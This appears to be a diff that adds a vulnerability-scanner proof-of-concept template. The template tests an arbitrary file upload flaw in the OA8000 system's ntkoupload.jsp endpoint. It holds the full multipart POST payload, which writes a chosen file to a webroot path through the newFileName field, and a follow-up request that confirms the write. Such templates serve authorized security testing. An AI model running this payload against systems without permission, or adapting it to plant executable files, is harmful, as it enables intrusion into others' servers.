@@ -1,0 +1,32 @@
+name: poc-yaml-oa8000-ntkoupload-cnvd-2022-54886-upload
+binding: bfd021e9-5267-42e5-8101-c628a777da25
+manual: true
+detail:
+    author: iak3ec(https://github.com/nu0l)
+    links:
+        - https://github.com/Phuong39/2022-HW-POC
+    vulnerability:
+        id: CT-517590
+        level: high
+    warning: 注意该脚本会上传文件产生一个临时的无害文件
+transport: http
+set:
+    s1: randomLowercase(16)
+    s2: randomLowercase(32)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+            body: "------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"EDITFILE\"; filename=\"{{s1}}.txt\"\r\nContent-Type: image/png\r\n\r\n{{s2}}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name=\"newFileName\"\r\n\r\nD:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/{{s1}}.txt\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm-- "
+        expression: response.status == 200 && response.body.bcontains(bytes("Content-Style-Type")) && response.headers["Set-Cookie"].contains("OAapp")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /OAapp/htpages/app/module/login/{{s1}}.txt
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
+expression: r0() && r1()
